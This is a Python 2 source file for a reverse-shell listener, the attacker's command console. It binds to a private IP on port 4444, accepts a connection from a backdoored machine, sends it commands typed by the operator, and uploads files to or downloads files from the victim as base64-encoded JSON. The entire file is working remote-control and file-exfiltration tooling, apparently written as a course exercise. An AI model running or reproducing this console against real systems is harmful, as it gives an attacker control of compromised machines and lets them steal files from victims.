#!/usr/bin/python2.7

import socket
import json
import base64

ip = "192.168.43.103"
port = 4444

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind((ip, port))
listener.listen(0)
print "[+] Waiting for Incoming Connection"
connection, address = listener.accept()
print "[+] Got a Connection from " + str(address)


def reliable_send(data):
    json_data = json.dumps(data)
    connection.send(json_data)


def reliable_receive():
    json_data = ""
    while True:
        try:
            json_data = json_data + connection.recv(1024)
            data = json.loads(json_data)
            return base64.b64decode(data)
        except ValueError:
            continue


def execute_remotely(command):
    reliable_send(command)
    if command[0] == "exit":
        connection.close()
        exit()
    return reliable_receive()


def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Download Successful"


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


while True:
    command = raw_input(">> ")
    command = command.split(" ")

    try:
        if command[0] == "upload":
            file_content = read_file(command[1])
            command.append(file_content)

        result = execute_remotely(command)

        if command[0] == "download" and "[-] Error " not in result:
            result = write_file(command[1], result)

    except Exception:
        result = "[-] Error during command execution"

    print result

